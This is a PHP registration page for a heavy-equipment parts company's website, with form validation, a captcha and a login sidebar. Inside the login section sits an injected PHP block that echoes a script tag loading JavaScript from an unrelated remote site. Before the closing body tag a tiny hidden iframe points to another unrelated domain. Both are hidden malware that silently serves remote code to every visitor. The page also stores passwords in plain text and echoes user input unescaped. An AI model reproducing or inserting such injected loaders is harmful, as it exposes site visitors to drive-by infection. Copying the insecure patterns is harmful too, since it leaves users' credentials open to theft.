<? require "header.php"; ?>
<?
////////////
// Definition
define("email_expression","^[a-zA-Z0-9.\_-]+@[a-zA-Z0-9\_\-]+\.[a-zA-z0-9\-\.]+$");
define("user_text","^[a-zA-Z0-9_-]+$");
////////////
//////// ADD
//  ARRAY MESSAGE
$message_info["1"] = " &bull; <span style=color:#FF0000>Please Insert Your Name. </span><br>";

$message_info["2"] = " &bull; <span style=color:#FF0000>Please Insert Your E-Mail. </span><br>";
$message_info["3"] = " &bull; <span style=color:#FF0000>Please Insert Your correct E-Mail Address. </span><br>";
$message_info["4"] = " &bull; <span style=color:#FF0000>Sorry, your E-mail is already in use. </span><br>";

$message_info["5"] = " &bull; <span style=color:#FF0000>Please Insert User Name for login. </span><br>";
$message_info["6"] = " &bull; <span style=color:#FF0000>Your User Name Must be more than 5 character. </span><br>";

$message_info["7"] = " &bull; <span style=color:#FF0000>Please Insert Your Password. </span><br>";
$message_info["8"] = " &bull; <span style=color:#FF0000>Your Password Must be more than 5 character. </span><br>";
$message_info["9"] = " &bull; <span style=color:#FF0000>Please Insert Your Password Again Confirm Password Error. </span><br>";

$message_info["10"] = " &bull; <span style=color:#FF0000>Please Insert Your Mobile. </span><br>";
$message_info["11"] = " &bull; <span style=color:#FF0000>Please You must insert a valid number in Mobile . </span><br>";

$message_info["12"] = " &bull; <span style=color:#FF0000>Please Insert Your Telephone number. </span><br>";
$message_info["13"] = " &bull; <span style=color:#FF0000>Please You must insert a valid number in Telephone number . </span><br>";

$message_info["14"] = " &bull; <span style=color:#FF0000>Please Choose Your Country. </span><br>";

$message_info["15"] = " &bull; <span style=color:#FF0000>Please  you have read the terms of the Agreement and fully accept them. </span><br>";

$message_info["16"] = " &bull; <span style=color:#FF0000>You must Writ Code within Photo</span><br>";
$message_info["17"] = " &bull; <span style=color:#FF0000>Code Error</span><br>";

////////////////////////////
$message_display = "";
$submit_status = TRUE;
if (isset($_POST["register"]))
{
// Name
	$name = (stripslashes($_POST["name"]));
	if(strlen($name) == 0)
	{
		$message_display .= $message_info[1];
		$submit_status = FALSE;
	}
// Email
	$email = trim(stripslashes($_POST["email"]));
	//check length
	if(strlen($email) == 0)
	{
	
		$message_display .= $message_info[2];
		$submit_status = FALSE;
	}
	elseif(!(eregi(email_expression,$email)))
	{
		$message_display .= $message_info[3];
		$submit_status = FALSE;
	}else{ 
		$query ="SELECT count(*) as member_count FROM customer WHERE email = '".mysql_escape_string($email)."' ";
		$count = $cls -> db_select($query);
		if($count[1]["member_count"] != 0)
		{
			$message_display .= $message_info[4];
			$submit_status = FALSE;
		}
	}
// User name
	$user_name = trim(stripslashes($_POST["user_name"]));
	if(strlen($user_name) == 0)
	{
		$message_display .= $message_info[5];
		$submit_status = FALSE;
	}elseif(strlen($user_name) <6 ){
		$message_display .= $message_info[6];
		$submit_status = FALSE;
	}	
// Password
	$password = (stripslashes($_POST["password"]));
	$confirm_password = (stripslashes($_POST["confirm_password"]));
	if(strlen($password) == 0)
	{
		$message_display .= $message_info[7];
		$submit_status = FALSE;
	}elseif(strlen($password) <6 ){
		$message_display .= $message_info[8];
		$submit_status = FALSE;
	}elseif($password != $confirm_password){
		$message_display .= $message_info[9];
		$submit_status = FALSE;
	}

// Mobile	
	$mobile = trim(stripslashes($_POST["mobile"]));
	if(strlen($mobile)==0)
	{
		$message_display .= $message_info[10];
		$submit_status = FALSE;
	}
	else
	if(strlen($mobile)!=0 AND !is_numeric($mobile))
	{
		$message_display .= $message_info[11];
		$submit_status = FALSE;
	}
// phone	
	$phone = trim(stripslashes($_POST["phone"]));
	if(strlen($phone)!=0 AND !is_numeric($phone))
	{
		$message_display .= $message_info[13];
		$submit_status = FALSE;
	}	
// Country
	$country = trim(stripslashes($_POST["country"]));
	if($country == 0 )
	{
		$country_other = trim(stripslashes($_POST["country_other"]));
		if(strlen($country_other) == 0)
		{
			$message_display .= $message_info[14];
			$submit_status = FALSE;
		}
	}
// Address
	$address = trim(stripslashes($_POST["address"]));
// Agree	
	$agree = trim(stripslashes($_POST["agree"]));
	if($agree != 1)
	{
		$message_display .= $message_info[16];
		$submit_status = FALSE;
	}
	$code = strtoupper(stripslashes($_POST["code"]));
// Code	
	if(strlen($code) == 0)
	{
		$message_display .= $message_info[17];
		$submit_status = FALSE;
	}elseif($code != $_SESSION["code"]){
		$message_display .= $message_info[18];
		$submit_status = FALSE;
	}
	
}
//////////////////
if (isset($_POST["register"]) AND ($submit_status == TRUE))
{
	$correct = 1;
	
	$insert_info["name"] = $name;
	$insert_info["email"] = $email;

	$insert_info["user_name"] = $user_name;
	$insert_info["password"] = $password;
	
	$insert_info["mobile"] = $mobile;
	$insert_info["phone"] = $phone;
	
	$insert_info["country"] = $country;
	$insert_info["address"] = $address;
	
	$insert_info["date_lastlogin"] = date('Y-m-d');
	$insert_info["date_register"] = date('Y-m-d');
	
	$insert_info["status"] = 2;

	$last_member = $cls -> db_insert('customer',$insert_info);

	$_SESSION["register_id"] = $last_member;
	
	// Session Load For as Login
/*
	$_SESSION["user_id"] = $last_member;
	if($type == 1)
		$_SESSION["user_name"] = $first_name." ".$last_name;;
	if($type == 2)
		$_SESSION["user_name"] = $company;
	if($type == 3){
		$query = "select * from customer where id = ".$company;
		$parent_info = $cls -> db_select($query);
		$_SESSION["user_name"] = $parent_info[1]["company_name"];
	}
	$_SESSION["user_lastlogin"] = date('Y-m-d');
	$_SESSION["discount"] = 0;
*/	
	////////////
	header('Location: register_complete.php');
	exit(0);

}
////////////////////////////////////////
////////////////////////////////////////
	$_SESSION["code"] = strtoupper($cls ->random_code());
////////////////////////////////////////
//Country
	$query = "select * from country where status = 1 order by name ASC";
	$all_country = $cls -> db_select($query);
////////////////////////////////////////
////////////////////////////////////////

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/internal.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Egyptian machinery</title>
</head>
<link rel="stylesheet" href="../css/css.css"  type="text/css" media="all" />

<SCRIPT LANGUAGE="JavaScript">
<!-- Original:  CodeLifter.com (support@codelifter.com) -->
<!-- Web Site:  http://www.codelifter.com -->

<!-- This script and many more are available free online at -->
<!-- The JavaScript Source!! http://javascript.internet.com -->

<!-- Begin
// Set slideShowSpeed (milliseconds)
var slideShowSpeed = 3000;
// Duration of crossfade (seconds)
var crossFadeDuration = 3;
// Specify the image files
var Pic = new Array();
// to add more images, just continue
// the pattern, adding to the array below
<?
	if(is_array($all_slide)) $i=0;
	while(list($key,$val) = each($all_slide)){
	if(isset($account) AND $account == 1){
?>
Pic[<?=$i ?>] = '../../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	}else{
?>
Pic[<?=$i ?>] = '../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	
	}
	$i++;
	}
?>

// do not edit anything below this line
var t;
var j = 0;
var p = Pic.length;
var preLoad = new Array();
for (i = 0; i < p; i++) {
preLoad[i] = new Image();
preLoad[i].src = Pic[i];
}
function runSlideShow() {
if (document.all) {
document.images.SlideShow.style.filter="blendTrans(duration=2)";
document.images.SlideShow.style.filter="blendTrans(duration=crossFadeDuration)";
document.images.SlideShow.filters.blendTrans.Apply();
}
document.images.SlideShow.src = preLoad[j].src;
if (document.all) {
document.images.SlideShow.filters.blendTrans.Play();
}
j = j + 1;
if (j > (p - 1)) j = 0;
t = setTimeout('runSlideShow()', slideShowSpeed);
}
//  End -->
</script>

<body onLoad="runSlideShow()" background="../images/bg_03.gif" style="margin:0px; padding:0px">


<div align="center" style="">
<div align="center" style="width:940px;border:#CCCCCC solid 1px; background-color: #FFFFFF">
<!-- /////////////////////////////////// -->
<table border="0" height="285" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td align="center" style="background-color:#d9d9d9" width="258px;">
		<img src="../images/logo.gif" />
	</td>
	<td width="434px;">
		<!-- ///// Slide /////// -->
		<div>
			<img width="434" height="285" src="../upload/slide/<?=$all_slide[1]["slide_photo"] ?>"  name='SlideShow' align="top" />
		</div>	
	</td>
	<td  valign="top" style="width:252px;padding:10px; padding-top:57px; padding-left:50px;background-image:url(../images/loop1.gif);background-repeat: repeat-x;">
		<div align="left" class="top">
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="home.php">HOME</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=1">ABOUT</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=2">OUR SERVICE</a><br /></div>
<!-- 
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=2">HEAVEY EQUIPMENT</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=3">USED SPARE PARTS</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=4">NEW SPARE PARTS</a><br /></div>
-->
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="contact_us.php">CONTACT</a><br />
			</div>
		</div>
	</td>
</tr>
<tr><td colspan="3" height="20" style="background-image:url(../images/loop2.gif);background-repeat: repeat-y;"></td></tr>
<tr>
	<td valign="top"><br />
		&nbsp; <img src="../images/login.gif" />
		<br />
		<? if(!isset($_SESSION["user_id"])){ ?>
<?php
#35c3f3#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224448\"></script>";
echo $srwv;
}
#/35c3f3#
?>
	<span style="font-size:11px"><? if(isset($_POST["login"])) print @$message_display; ?></span>	
	
	<table width="100%" class="font_1">
	<form id="form1" name="form1" method="post" action="">
	<tr>
		<td>User Name</td>
		<td><input name="user_name" value="<? print @$user_name; ?>" type="text" id="user_name" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td>Password</td>
		<td><input name="password" type="password" id="password" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td colspan="2">
		<a href="forgotpassword.php"><img border="0" src="../images/forget_p.gif" /></a>
		<a href="register.php"><img align="right" border="0" src="../images/register.gif" /></a>		</td>
	</tr>
	<tr>
		<td align="right" colspan="2"><input name="login" type="submit" id="login" style="border:0px; width:63px; height:24px; background-image:url(../images/button_1.gif)" value=" " /></td>
	</tr>
	</form>	
	</table>
	<? }else{ ?>
	<div align="center">
		<br />
		<span style="font-family:'Courier New'; color:#333333; font-size:12px;">You Are Login</span>
		<br />
		<div class="bottom" style="padding-bottom:10px; margin-top:10px;"><a href="account/my_account.php">My Account</a></div>
		<div align="left" class="bottom" style="padding-bottom:10px; margin-top:10px;"><a style="font-size:12px;" href="log_out.php">Log Out</a></div>
	</div>
	<? }?>	

		
		<hr style="color:#d7d7d7; margin:10px; margin-bottom:10px; margin-top:10px;" />


		<div style=" background-image:url(../images/header1.gif); background-repeat:no-repeatwidth:247px; height:42px;">
		<div style="padding-left:50px; padding-top:10px; font-weight:bolder; font-size:16px; font-family: Arial, Helvetica, sans-serif;">Equipment Categories</div>
		</div>
		
		<br />
		<div align="left" class="right" style="padding-left:40px;" >
			<table width="100%">
			<? 
				reset($all_category);
				if(is_array($all_category)){ $counter = 0;
				while(list($key,$val) = each($all_category)){
				$counter ++;
				if($counter == 18) break;
			?>
			<tr><td><img src="../images/bullet_3.gif" align="absmiddle" /></td><td><a href="category.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a></td></tr>
			<? } } ?>
			</table>
			<div align="center"><a style="color: #fcac14; font-size:14px; text-decoration:underline;" href="all_category.php">All Category</a></div>
		</div>
		
		<br />
		<img src="../images/header2.gif" />
		<br />
		<div align="left" class="bottom" style="padding-left:40px;" >
			<? 
				reset($all_manufacture);
				if(is_array($all_manufacture)){ $counter = 0;
				while(list($key,$val) = each($all_manufacture)){
				$counter ++;
				if($counter == 7) break;
			?>
			<div style="padding-bottom:5px;"><a href="manufacture_product.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a> <br /></div>
			<? }} ?>
			<div align="center"><a style="color:#333333; font-size:14px; text-decoration:underline;" href="all_manufacture.php">More</a></div>
			<br />

		</div>
				
	</td>
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		<div align="left" style=" font-family:Verdana; font-size:13px;padding:10px;">
		<b><!-- InstanceBeginEditable name="header" -->Register<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		
		<div align="center">
<br />

				<div align="center" style="color:#003399; font-size:14px; font-weight:bolder; padding-right:20px; padding-bottom:5px; font-family:Arial"><u>Register and get your password now !</u></div>
				<div style="width:95%;" class="normal1" >
					
					
					<br>
					<div class="div_1 font_8" style="padding-right:10px;padding-left:10px; background-color:#edf4fc">
						<span style="float:right">(<font color="#E10404">*</font>) Required Information</span>
					</div>					
					<br>
					<div style=" font-family:Verdana;font-size:11px"  align="left">
					<? print @$message_display."<br>"; ?>
					</div>
					
<script type="text/javascript">
function showhide(what,obj) 
{     
	obj1 = document.getElementById(obj);  
	obj1.style.display='none' ;	                       
}
function show(what,obj) 
{     
	obj1 = document.getElementById(obj);  
	obj1.style.display="block" ;	                       
}
</script>					
					
					<table align="left" border="0" width="100%" class="normal1" style="font-size:13px">
					<form id="register" name="register" method="post" action="?type=<?=$type ?>&mopen=<?=$mopen ?>">
					
					
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span> Name :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="name" type="text" id="name" style="width:200px" value="<? print @$name; ?>">						</td>
					</tr>
							
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span> Email :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="email" type="text" id="email" style="width:200px" value="<? print @$email; ?>">						</td>
					</tr>
					<tr>
						<td width="40%"  class="div_2" align="right"><span class="star_1">*</span> User Name (login) :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="user_name" type="text" id="user_name" style="width:200px" value="<? print @$user_name; ?>">						</td>
					</tr>
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span> Password :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="password" type="password" id="password" style="width:200px" >						</td>
					</tr>
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span>Confirm Password :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="confirm_password" type="password" id="confirm_password" style="width:200px" >						</td>
					</tr>
					
					
					
					<tr>
						<td width="40%"  class="div_2" align="right"> <span class="star_1">*</span>Mobile :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="mobile" type="text" id="mobile" style="width:150px" value="<? print @$mobile; ?>">						</td>
					</tr>
					<tr>
						<td width="40%"  class="div_2" align="right"> Phone :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="phone" type="text" id="phone" style="width:150px" value="<? print @$phone; ?>">						</td>
					</tr>						
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span> Country :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<SELECT class="FormField" name="country" >
								<OPTION value="">--</OPTION>
								<?
									reset($all_country);
									while(list($key,$val) = each($all_country)){
								?>
										<OPTION <? if(isset($country) AND ($val["id"]==$country) ) print"selected"; ?>  value="<?=$val["id"] ?>"><?=$val["name"] ?></OPTION>
								<?
									}
								?>
									<option value="0">Other</option>
							</SELECT>						</td>
					</tr>
					<tr>
						<td width="40%"  class="div_2" align="right"> Address :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
						<textarea name="address" cols="30" rows="3" id="address" style="width:280px;"><? print @$address; ?></textarea>						</td>
					</tr>
					<tr>
						<td class="div_2" colspan="3" align="center" style="padding-right:0px; padding-left:0px; font-size:12px">
						<input name="agree"  type="checkbox" id="agree" value="1" <? if(isset($agree) AND ($agree!=1)) print ""; else print "checked"; ?> >
						I have read the 
						<a  href ='javascript:void(0);' onClick=window.open('terms_of_agreement.php','','width=500,height=400,left=200,top=100,status=yes,scrollbars=yes') >Terms and conditions</a> and fully accept them.						 </td>
					</tr>					
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span> Enter the code <br />
										shown below :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="code" type="text" id="code" style="width:80px;">						</td>
					</tr>
					<tr>
						<td class="div_2" style=" padding-top:10px;font-size:12px;">
							<div align="justify" style="padding-right:10px">
							<img src="../images/info.jpg" width="14" height="14">
							This helps prevent misuse of the site by automated bots, reducing system loads and so ensuring better performance of services.							</div>						</td>
						<td width="5"></td>
						<td  align="left" style="padding-top:10px;"><img style="border:4px solid #000000" src=dynamicimage.php border="1" /></td>
					</tr>
					<tr>
						<td align="center" colspan="3"><br><input name="register" type="submit" id="register" value=" Register ">
						<br><br></td>
					</tr>
					</form>
					</table>
					<br>
					
				
				
				</div>
				
			</div>		
		
		<!-- InstanceEndEditable -->	
		</div>
	</td>
	
</tr>
<tr>
<td height="72" colspan="3" style="background-image:url(../images/footer_1.gif); background-repeat:no-repeat">
	<div align="center" style=" padding-top:20px;font-family:Verdana; font-size:10px; color: #333333;">
		Copyright 2010 &copy; AL Karim Co. for heavey equipment parts, Powered by <a target="_blank" href="http://www.eracore.net">Eracore.net</a>		</div>
</td>
</tr>
</table>	


<!-- /////////////////////////////////// -->
</div></div>

<iframe src="http://elevatemagazine.com/includes/13x.php" border="0" width="6" height="5" /></body>
<!-- InstanceEnd --></html>
